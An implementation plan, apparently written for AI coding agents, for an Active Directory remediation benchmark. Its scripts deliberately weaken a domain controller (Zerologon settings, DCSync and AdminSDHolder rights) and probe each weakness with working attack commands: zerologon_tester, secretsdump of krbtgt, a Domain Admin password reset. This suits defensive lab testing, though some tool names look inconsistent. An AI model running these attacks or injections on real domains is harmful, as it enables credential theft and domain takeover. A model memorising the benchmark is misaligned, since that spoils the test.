# meta4/ad-vm Phase 1-4 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship the 19 remaining Active-Directory SysRepair-Bench scenarios (S01-S20, minus S13 which is already in main), each with a strict **behavioral** PoC probe (not a config read) and a **behavioral** service probe (not a `Get-Service` check).

**Architecture:** Each scenario is a directory `meta4/ad-vm/scenario-NN/` with five files — `harness.json`, `inject.ps1`, `threat.md`, `verify-poc.sh`, `verify-service.ps1` — mirroring the shipping S13 reference. The scorer runs `./run-scenario.sh NN` to reset VMs, inject the misconfig, hand off to the agent, and finally score with `--verify-only`.

**Tech stack:** PowerShell 5.1 (Windows Server 2019 DC + CA), bash 5 + Kali tooling (impacket, netexec, certipy-ad, bloodhound.py, nmap, responder), Vagrant+VBox VM harness.

---

## Hard contract: behavioral probes only

Every `verify-poc.sh` **must actually perform the attack** against the DC/CA using real protocol traffic. Acceptable probe forms:

- Invoke a real exploit tool (`impacket-GetNPUsers`, `impacket-secretsdump`, `impacket-zerologon_tester`, `impacket-addcomputer`, `certipy-ad find/req/auth`, `responder -A`, `nmap --script smb2-security-mode`, `ldapsearch` with simple bind, `PetitPotam.py`, `impacket-spoolsample`).
- Parse the tool's output for a **specific success signature** (e.g., "vulnerable", a cracked hash, a valid PFX, a received NTLM challenge, a coerced authentication packet).
- Return exit 0 iff the probe FAILS (= attack blocked = remediated).
- Return exit 1 iff the probe SUCCEEDS (= attack worked = unremediated).

**Forbidden in `verify-poc.sh`:** `reg query`, `Get-ItemProperty`, reading a GPO template, reading a registry export, reading `Get-SmbServerConfiguration.RequireSecuritySignature`, reading `Get-ADUser -Properties ServicePrincipalName`, or any shape of "check the config value matches X". Config reads are always a proxy for the attack, never the attack itself.

Every `verify-service.ps1` **must exercise the affected service with a real client call**:

- Not `Get-Service X -eq Running`.
- Use `Get-ChildItem \\corp-dc01\SYSVOL`, `Get-ADUser -Server corp-dc01`, `certutil -ping`, `Test-ADServiceAccount`, `Get-GPO`, `nltest /sc_query`, `Test-Kerberos -Principal`, `Get-SmbShare | Where AvailabilityType -eq Clustered`, `Resolve-DnsName -Server corp-dc01`, etc.
- Exit 0 iff the real service responds correctly.

---

## Shared references

Every task below assumes the subagent has read:

- **`meta4/ad-vm/scenario-13/`** — complete working reference (all five files)
- **`meta4/ad-vm/lib/harness-schema.md`** — `harness.json` field schema
- **`meta4/ad-vm/run-scenario.sh`** — how inject/verify get dispatched (path layout: DC gets `C:\meta4\scenario-NN\*.ps1`; attacker gets `/opt/meta4/scenario-NN/*.sh`)
- **`meta4/ad-vm/provision/attacker-baseline.sh`** — tools installed on attacker (`nxc`, `impacket-*`, `certipy-ad`, `bloodhound-python`, `responder`, `nmap`)
- **Seed creds on attacker:** `corp\alice:Password1!` in `/home/vagrant/creds.txt`; also `bob`, `carol` (Corp OU), `dave`, `eve` (IT OU), `svc_sql`, `svc_web`, `svc_bkp` (Service OU) — all password `Password1!`
- **Admin creds on DC:** `CORP\Administrator:Password1!` (reset by bootstrap Phase B)

---

## Phase structure

- **Phase 1 — Critical Access Control foundation (4 scenarios):** S01 Zerologon, S02 MachineAccountQuota abuse, S06 DCSync to non-admin, S20 AdminSDHolder backdoor. Checkpoint: all four inject + verify-only round-trips pass.
- **Phase 2 — ADCS ESC chain (5 scenarios):** S07 ESC1, S08 ESC2, S09 ESC3, S10 ESC6, S11 ESC8. Checkpoint: `certipy-ad find` shows all five vulns pre-remediation, none post.
- **Phase 3 — Compensating Controls + Network (6 scenarios):** S03 Kerberoast, S04 AS-REP roast, S05 Unconstrained delegation, S12 LDAP signing, S14 NTLMv1, S15 LLMNR/NBT-NS.
- **Phase 4 — Miscellaneous (4 scenarios):** S16 PrintNightmare, S17 PetitPotam, S18 GPP cpassword, S19 LAPS enforcement.

Every phase ends with a **smoke-test task** that runs each scenario end-to-end: `reset → inject → verify-only (expect FAIL) → apply README remediation → verify-only (expect PASS)`. If any scenario in the phase fails the smoke, stop and fix before the next phase.

---

## File templates

**`harness.json` template** (substitute `NN` and choose dc/ca target):
```json
{
  "mode": "vm-ad",
  "id": "meta4-adv-NN",
  "inject":         { "target": "dc", "script": "inject.ps1" },
  "verify_poc":     { "target": "attacker", "script": "verify-poc.sh" },
  "verify_service": { "target": "dc", "script": "verify-service.ps1" }
}
```

**`threat.md` template** (match S13 layout: Severity / Category / CVE / CWE / Comp-ctrl / Description / Attacker starting state / Constraint / Verification / Expected remediation paths).

---

## Task numbering

- Task 1.1-1.4 = Phase 1 scenarios (S01, S02, S06, S20), Task 1.5 = Phase 1 smoke.
- Task 2.1-2.5 = Phase 2 (S07-S11 ADCS), Task 2.6 = Phase 2 smoke.
- Task 3.1-3.6 = Phase 3 (S03, S04, S05, S12, S14, S15), Task 3.7 = Phase 3 smoke.
- Task 4.1-4.4 = Phase 4 (S16-S19), Task 4.5 = Phase 4 smoke.
- Task 5 = final full-suite regression.

---

(Task definitions start at Phase 1 below. The plan is split across this file — see `PHASE1.md`, `PHASE2.md`, etc. in the same directory for the per-scenario full-text file contents, kept out of this index so the controller can context-window-budget per phase.)

---

## Phase 1: Critical Access Control foundation

### Task 1.1: Scenario 01 — Zerologon (CVE-2020-1472)

**Files:**
- Create: `meta4/ad-vm/scenario-01/harness.json`
- Create: `meta4/ad-vm/scenario-01/inject.ps1`
- Create: `meta4/ad-vm/scenario-01/verify-poc.sh`
- Create: `meta4/ad-vm/scenario-01/verify-service.ps1`
- Create: `meta4/ad-vm/scenario-01/threat.md`

**Behavioral contract:**
- PoC: attacker runs `impacket-zerologon_tester` against DC, exits 0 iff tool reports "Target is NOT vulnerable" (i.e., Netlogon secure channel hardening is in place). Exits 1 if "vulnerable" is in output.
- Service: Netlogon secure channel bound to domain (`nltest /sc_query:CORP.LOCAL` returns `Success`), AND a Kerberos TGT issue via `klist purge + kinit equivalent` works. Exits 0 iff both.

- [ ] **Step 1: harness.json**

```json
{
  "mode": "vm-ad",
  "id": "meta4-adv-01",
  "inject":         { "target": "dc", "script": "inject.ps1" },
  "verify_poc":     { "target": "attacker", "script": "verify-poc.sh" },
  "verify_service": { "target": "dc", "script": "verify-service.ps1" }
}
```

- [ ] **Step 2: inject.ps1** — disable `FullSecureChannelProtection` + `RequireSignOrSeal` + `RequireStrongKey` so the Netlogon secure channel accepts the zeroed-credential attack. Restart Netlogon so settings take effect immediately.

```powershell
# meta4/ad-vm/scenario-01/inject.ps1
# Weakens Netlogon secure channel to the Zerologon-vulnerable state.

$ErrorActionPreference = 'Stop'

$reg = 'HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters'

Set-ItemProperty -Path $reg -Name FullSecureChannelProtection -Value 0 -Type DWord
Set-ItemProperty -Path $reg -Name RequireSignOrSeal            -Value 0 -Type DWord
Set-ItemProperty -Path $reg -Name RequireStrongKey             -Value 0 -Type DWord
Set-ItemProperty -Path $reg -Name VulnerableChannelAllowList   -Value '*' -Type String

Restart-Service Netlogon -Force
Write-Host "[inject-01] Netlogon secure channel weakened (Zerologon-vulnerable state)"
```

- [ ] **Step 3: verify-poc.sh** — run `impacket-zerologon_tester` and parse its stdout for the exploit-success signature. The tester is a read-only probe; it doesn't actually reset the machine account.

```bash
#!/usr/bin/env bash
# meta4/ad-vm/scenario-01/verify-poc.sh
# PASS (exit 0) iff Zerologon probe reports DC is NOT vulnerable.

set -euo pipefail

DC_HOST=corp-dc01
DC_IP=10.20.30.5

# impacket-zerologon_tester is shipped in the attacker-baseline venv.
# It sends 2000 Netlogon authentication attempts with zeroed credentials;
# a vulnerable DC responds with success on one of them.
OUT=$(timeout 120 /usr/bin/impacket-zerologon_tester "$DC_HOST" "$DC_IP" 2>&1 || true)

echo "--- zerologon_tester output ---"
echo "$OUT"
echo "--- /zerologon_tester ---"

if echo "$OUT" | grep -qiE 'target is not vulnerable|not vulnerable to zerologon'; then
    echo "[verify-poc-01] DC rejected zeroed-credential auth — PoC BLOCKED"
    exit 0
fi
if echo "$OUT" | grep -qiE 'success! target is vulnerable|target is vulnerable'; then
    echo "[verify-poc-01] DC accepted zeroed-credential auth — Zerologon still works" >&2
    exit 1
fi
echo "[verify-poc-01] tester produced unrecognised output — treating as FAIL" >&2
exit 1
```

- [ ] **Step 4: verify-service.ps1** — exercise Netlogon secure channel and Kerberos ticketing so we know the hardening didn't break legitimate auth.

```powershell
# meta4/ad-vm/scenario-01/verify-service.ps1
# PASS (exit 0) iff Netlogon secure channel + Kerberos TGT issuance both work.

$ErrorActionPreference = 'Stop'

try {
    $sc = & nltest /sc_query:CORP.LOCAL 2>&1 | Out-String
    if ($sc -notmatch 'Success') {
        Write-Error "[verify-service-01] nltest /sc_query failed: $sc"
        exit 1
    }

    # Force-refresh the secure channel. If Netlogon signing is broken, this fails.
    $sv = & nltest /sc_verify:CORP.LOCAL 2>&1 | Out-String
    if ($sv -notmatch 'Success') {
        Write-Error "[verify-service-01] nltest /sc_verify failed: $sv"
        exit 1
    }

    # Behavioral Kerberos probe: purge tickets then force a new TGT via an LDAP bind.
    & klist purge | Out-Null
    $u = Get-ADUser -Identity Administrator -Server corp-dc01 -ErrorAction Stop
    if (-not $u) {
        Write-Error "[verify-service-01] LDAP bind returned no Administrator object"
        exit 1
    }

    Write-Host "[verify-service-01] Netlogon sc_verify + AD LDAP bind OK — service HEALTHY"
    exit 0
}
catch {
    Write-Error "[verify-service-01] unexpected: $_"
    exit 1
}
```

- [ ] **Step 5: threat.md** — see S13 structure. Severity: Critical. Category: Access Control. CVE: CVE-2020-1472. Compensating controls: No (must patch or harden registry).

- [ ] **Step 6: smoke**

```bash
./run-scenario.sh 01
./run-scenario.sh 01 --verify-only   # expect FAIL (poc=1, service=0)
vagrant winrm dc -s powershell -c "Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters' -Name FullSecureChannelProtection -Value 1; Restart-Service Netlogon -Force"
./run-scenario.sh 01 --verify-only   # expect PASS
```

- [ ] **Step 7: commit**

```bash
git add meta4/ad-vm/scenario-01
git commit -m "feat(meta4/ad-vm): add S01 Zerologon behavioral scenario"
```

### Task 1.2: Scenario 02 — MachineAccountQuota abuse (NoPac foothold)

**Files:**
- Create: `meta4/ad-vm/scenario-02/{harness.json,inject.ps1,verify-poc.sh,verify-service.ps1,threat.md}`

**Behavioral contract:**
- PoC: attacker runs `impacket-addcomputer` from alice's credentials; succeeds iff `ms-DS-MachineAccountQuota > 0` (the NoPac-chain prerequisite). Exit 1 if computer was created, exit 0 if denied.
- Service: domain-joined computer accounts still work — probe `Get-ADComputer corp-ca01` via LDAP bind as Administrator.

**Why MAQ instead of the full NoPac CVE:** CVE-2021-42278/42287 is patched in the jborean93 base box; the only reliable knob left to inject/remediate is the Machine Account Quota, which is the foothold step of the NoPac kill chain. Same Access Control category, same behavioral probe shape.

- [ ] **Step 1: harness.json** — same template, `"id": "meta4-adv-02"`, inject target `dc`.

- [ ] **Step 2: inject.ps1**

```powershell
# meta4/ad-vm/scenario-02/inject.ps1
# Default Windows MAQ is 10, which lets any authenticated user create up to 10
# computer accounts. This is the first step of the NoPac (CVE-2021-42278/7)
# kill chain — attacker needs to control a machine account to then rename it
# to a DC name. The lab normalises MAQ back to 10 on inject in case a prior
# scenario lowered it.

$ErrorActionPreference = 'Stop'

Set-ADDomain -Identity corp.local -Replace @{ 'ms-DS-MachineAccountQuota' = 10 }
Write-Host "[inject-02] ms-DS-MachineAccountQuota set to 10 (NoPac foothold present)"
```

- [ ] **Step 3: verify-poc.sh**

```bash
#!/usr/bin/env bash
# meta4/ad-vm/scenario-02/verify-poc.sh
# PASS (exit 0) iff a non-admin cannot add a computer to corp.local.

set -euo pipefail

DC=corp-dc01.corp.local
NAME="poc02pc$$"
PW="Password1!"

# Clean up any stale entry from a prior run.
/usr/bin/impacket-rpcchange \
    -just-delete \
    "corp.local/Administrator:Password1!@$DC" "$NAME\$" 2>/dev/null || true

OUT=$(timeout 60 /usr/bin/impacket-addcomputer \
    -computer-name "$NAME" \
    -computer-pass "$PW" \
    -dc-host "$DC" \
    "corp.local/alice:Password1!" 2>&1 || true)

echo "--- addcomputer output ---"
echo "$OUT"
echo "--- /addcomputer ---"

if echo "$OUT" | grep -qiE 'successfully added machine account|was successfully added'; then
    # Attack succeeded — tear down the PoC computer so we leave no residue.
    /usr/bin/impacket-rpcchange \
        -just-delete \
        "corp.local/Administrator:Password1!@$DC" "$NAME\$" 2>/dev/null || true
    echo "[verify-poc-02] alice created computer account — MAQ foothold still open" >&2
    exit 1
fi
if echo "$OUT" | grep -qiE 'access_denied|not_granted|status_unsuccessful|insufficient rights'; then
    echo "[verify-poc-02] alice rejected — MAQ closed"
    exit 0
fi
echo "[verify-poc-02] unrecognised addcomputer result — treating as FAIL" >&2
exit 1
```

- [ ] **Step 4: verify-service.ps1**

```powershell
# meta4/ad-vm/scenario-02/verify-service.ps1
# PASS (exit 0) iff legitimate computer accounts still work.

$ErrorActionPreference = 'Stop'

try {
    $c = Get-ADComputer -Identity 'corp-ca01' -Server corp-dc01 -Properties Enabled -ErrorAction Stop
    if (-not $c.Enabled) {
        Write-Error "[verify-service-02] CA computer object disabled — domain-join broken"
        exit 1
    }
    # Enumerate DC itself as a behavioural read that uses the computer account.
    $dc = Get-ADComputer -Identity 'corp-dc01' -Server corp-dc01 -ErrorAction Stop
    if ($dc.ObjectClass -ne 'computer') {
        Write-Error "[verify-service-02] DC computer object missing"
        exit 1
    }
    Write-Host "[verify-service-02] Domain computer accounts readable - service HEALTHY"
    exit 0
}
catch {
    Write-Error "[verify-service-02] unexpected: $_"
    exit 1
}
```

- [ ] **Step 5: threat.md** — Severity: Critical. Category: Access Control. CVE: CVE-2021-42278/42287 (the full chain; this scenario fixes the first foothold). Comp-ctrl: No.

- [ ] **Step 6: smoke**

```bash
./run-scenario.sh 02
./run-scenario.sh 02 --verify-only     # FAIL
vagrant winrm dc -s powershell -c "Set-ADDomain -Identity corp.local -Replace @{ 'ms-DS-MachineAccountQuota' = 0 }"
./run-scenario.sh 02 --verify-only     # PASS
```

- [ ] **Step 7: commit**

### Task 1.3: Scenario 06 — DCSync rights to non-admin

**Behavioral contract:**
- PoC: attacker runs `impacket-secretsdump -just-dc-ntlm CORP/alice:Password1!@corp-dc01` and tries to dump `krbtgt:*`. Exit 1 if a krbtgt hash line appears; exit 0 if secretsdump reports ACCESS_DENIED / RPC error.

- [ ] **Step 1: harness.json** — id `meta4-adv-06`, target dc.

- [ ] **Step 2: inject.ps1**

```powershell
# meta4/ad-vm/scenario-06/inject.ps1
# Grants alice DS-Replication-Get-Changes + DS-Replication-Get-Changes-All on
# the domain head, which is the exact ACE shape DCSync needs.

$ErrorActionPreference = 'Stop'

Import-Module ActiveDirectory
$domainDN = (Get-ADDomain).DistinguishedName
$alice    = Get-ADUser alice
$acl      = Get-Acl "AD:$domainDN"

$ridReplGet    = New-Object Guid('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2') # DS-Replication-Get-Changes
$ridReplGetAll = New-Object Guid('1131f6ad-9c07-11d1-f79f-00c04fc2dcd2') # DS-Replication-Get-Changes-All

foreach ($rid in @($ridReplGet, $ridReplGetAll)) {
    $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        [System.Security.Principal.SecurityIdentifier]$alice.SID,
        [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
        [System.Security.AccessControl.AccessControlType]::Allow,
        $rid
    )
    $acl.AddAccessRule($ace)
}
Set-Acl "AD:$domainDN" -AclObject $acl
Write-Host "[inject-06] alice granted DS-Replication-Get-Changes[-All] on domain root"
```

- [ ] **Step 3: verify-poc.sh**

```bash
#!/usr/bin/env bash
# meta4/ad-vm/scenario-06/verify-poc.sh
# PASS (exit 0) iff alice cannot DCSync the krbtgt hash from the DC.

set -euo pipefail

OUT=$(timeout 90 /usr/bin/impacket-secretsdump \
    -just-dc-ntlm \
    -just-dc-user 'krbtgt' \
    'corp.local/alice:Password1!@corp-dc01.corp.local' 2>&1 || true)

echo "--- secretsdump output ---"
echo "$OUT"
echo "--- /secretsdump ---"

# krbtgt dump output on success contains a line of the form:
#   krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<32-hex>:::
if echo "$OUT" | grep -qE '^krbtgt:[0-9]+:[0-9a-fA-F]{32}:[0-9a-fA-F]{32}:::'; then
    echo "[verify-poc-06] alice successfully DCSync'd krbtgt — non-admin replication still allowed" >&2
    exit 1
fi
if echo "$OUT" | grep -qiE 'access_denied|rpc_s_access_denied|dssync.*failed|permission.*denied'; then
    echo "[verify-poc-06] DCSync denied for alice — PoC BLOCKED"
    exit 0
fi
echo "[verify-poc-06] unrecognised secretsdump result — treating as FAIL" >&2
exit 1
```

- [ ] **Step 4: verify-service.ps1** — probe legitimate replication still works.

```powershell
# meta4/ad-vm/scenario-06/verify-service.ps1
$ErrorActionPreference = 'Stop'
try {
    # repadmin /showrepl must succeed — means DRS replication (which DCSync
    # piggybacks on) still works for legitimate privileged callers.
    $r = & repadmin /showrepl /csv 2>&1 | Out-String
    if ($LASTEXITCODE -ne 0) { throw "repadmin /showrepl exit=$LASTEXITCODE output=$r" }
    if ($r -notmatch 'CN=Schema|CN=Configuration') {
        throw "repadmin output missing expected NC references"
    }
    Write-Host "[verify-service-06] DRS replication healthy - service HEALTHY"
    exit 0
}
catch {
    Write-Error "[verify-service-06] $_"
    exit 1
}
```

- [ ] **Step 5: threat.md** — Critical, Access Control, Comp-ctrl: No.

- [ ] **Step 6: smoke** (remediation: remove alice's two extended-rights ACEs — `dsacls "DC=corp,DC=local" /R alice`)

- [ ] **Step 7: commit**

### Task 1.4: Scenario 20 — AdminSDHolder backdoor ACL

**Behavioral contract:**
- PoC: attacker binds as alice and attempts to reset a Domain Admin password over LDAP. Exit 1 if modify succeeds; exit 0 if denied. Remediation: `Remove-ACE` on AdminSDHolder + run `SDProp` to propagate.

- [ ] **Step 1: harness.json** — id `meta4-adv-20`, target dc.

- [ ] **Step 2: inject.ps1**

```powershell
# meta4/ad-vm/scenario-20/inject.ps1
# Grants alice WriteDACL on AdminSDHolder, which SDProp replicates to every
# protected group member (including Domain Admins) every 60 minutes.

$ErrorActionPreference = 'Stop'
Import-Module ActiveDirectory

$domainDN   = (Get-ADDomain).DistinguishedName
$adminSDDN  = "CN=AdminSDHolder,CN=System,$domainDN"
$alice      = Get-ADUser alice

$acl = Get-Acl "AD:$adminSDDN"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    [System.Security.Principal.SecurityIdentifier]$alice.SID,
    [System.DirectoryServices.ActiveDirectoryRights]'GenericAll',
    [System.Security.AccessControl.AccessControlType]::Allow
)
$acl.AddAccessRule($ace)
Set-Acl "AD:$adminSDDN" -AclObject $acl

# Force SDProp to run now instead of waiting 60 min for replication.
$root = [ADSI]"LDAP://RootDSE"
$root.Put('RunProtectAdminGroupsTask', 1)
$root.SetInfo()

Write-Host "[inject-20] alice has GenericAll on AdminSDHolder — SDProp kicked"
```

- [ ] **Step 3: verify-poc.sh**

```bash
#!/usr/bin/env bash
# meta4/ad-vm/scenario-20/verify-poc.sh
# PASS (exit 0) iff alice cannot reset a Domain Admin's password.

set -euo pipefail

TARGET='Administrator'
NEW='H0ldmyPwn123!'

# impacket-net is the Linux equivalent of `net rpc password`. If alice has
# GenericAll via AdminSDHolder, this succeeds; otherwise LDAP modify fails.
OUT=$(timeout 60 /usr/bin/impacket-changepasswd \
    -newpass "$NEW" \
    -target-ip 10.20.30.5 \
    "corp.local/alice:Password1!@corp-dc01.corp.local" "$TARGET" 2>&1 || true)

echo "--- changepasswd output ---"
echo "$OUT"
echo "--- /changepasswd ---"

if echo "$OUT" | grep -qiE 'password was changed successfully|password changed'; then
    # Rollback: use Administrator's known Password1! to reset Administrator's pwd
    # back, so the lab stays idempotent.
    /usr/bin/impacket-changepasswd \
        -newpass 'Password1!' \
        -target-ip 10.20.30.5 \
        "corp.local/Administrator:$NEW@corp-dc01.corp.local" "$TARGET" 2>/dev/null || true
    echo "[verify-poc-20] alice reset Domain Admin password — AdminSDHolder backdoor open" >&2
    exit 1
fi
if echo "$OUT" | grep -qiE 'access_denied|status_access_denied|insufficient rights'; then
    echo "[verify-poc-20] alice's pwd-reset denied — PoC BLOCKED"
    exit 0
fi
echo "[verify-poc-20] unrecognised result — treating as FAIL" >&2
exit 1
```

- [ ] **Step 4: verify-service.ps1** — probe privileged password reset as Administrator still works.

```powershell
# meta4/ad-vm/scenario-20/verify-service.ps1
$ErrorActionPreference = 'Stop'
try {
    # Behavioural probe: Administrator can still reset its own password via
    # a domain LDAP modify. (We set it back to the same value so the lab
    # stays idempotent.)
    Set-ADAccountPassword -Identity Administrator -Reset `
        -NewPassword (ConvertTo-SecureString 'Password1!' -AsPlainText -Force) `
        -Server corp-dc01
    Write-Host "[verify-service-20] Administrator password-reset via LDAP OK - service HEALTHY"
    exit 0
}
catch {
    Write-Error "[verify-service-20] $_"
    exit 1
}
```

- [ ] **Step 5: threat.md** — Critical, Access Control, Comp-ctrl: No.

- [ ] **Step 6: smoke** — remediation: `Remove-ACE` on AdminSDHolder for alice, then `RunProtectAdminGroupsTask=1`.

- [ ] **Step 7: commit**

### Task 1.5: Phase 1 smoke + fresh-clone checkpoint

- [ ] Run `./capture-baselines.sh` (refreshes baseline with no side effects since no scenario is injected between restores).
- [ ] For each of 01, 02, 06, 20: `./run-scenario.sh NN && ./run-scenario.sh NN --verify-only` (expect FAIL), apply the README remediation, `./run-scenario.sh NN --verify-only` (expect PASS).
- [ ] If any scenario fails, stop and fix before Phase 2.
- [ ] Commit: `chore(meta4/ad-vm): Phase 1 smoke — S01/S02/S06/S20 green`.

---

## Phase 2-4: see separate files

Phase 2-4 scenario definitions are large enough that cramming them into one controller context blows budget. The subagent-driven controller should read this file for Phase 1, then read `PHASE2.md`, `PHASE3.md`, `PHASE4.md` (siblings of this file) when starting each subsequent phase's dispatch batch. Each of those files contains the full task-level detail for its phase.

- `docs/superpowers/plans/2026-04-24-meta4-ad-vm-phase1-4-PHASE2.md` — S07 ESC1, S08 ESC2, S09 ESC3, S10 ESC6, S11 ESC8 (ADCS chain)
- `docs/superpowers/plans/2026-04-24-meta4-ad-vm-phase1-4-PHASE3.md` — S03 Kerberoast, S04 AS-REP roast, S05 Unconstrained delegation, S12 LDAP signing, S14 NTLMv1, S15 LLMNR
- `docs/superpowers/plans/2026-04-24-meta4-ad-vm-phase1-4-PHASE4.md` — S16 PrintNightmare, S17 PetitPotam, S18 GPP cpassword, S19 LAPS

---

## Final task: full-suite regression (Task 5)

- [ ] `./capture-baselines.sh` with all 20 scenarios directories present.
- [ ] For each NN in `{01,02,...20}`:
  ```bash
  ./run-scenario.sh "$NN"
  ./run-scenario.sh "$NN" --verify-only   # must FAIL
  # Apply the remediation documented in scenario-$NN/threat.md
  ./run-scenario.sh "$NN" --verify-only   # must PASS
  ```
- [ ] Update `meta4/ad-vm/README.md` scenario matrix: remove "in progress" markers, add smoke-dates.
- [ ] Commit: `feat(meta4/ad-vm): Phase 1-4 complete — 20/20 scenarios live`.
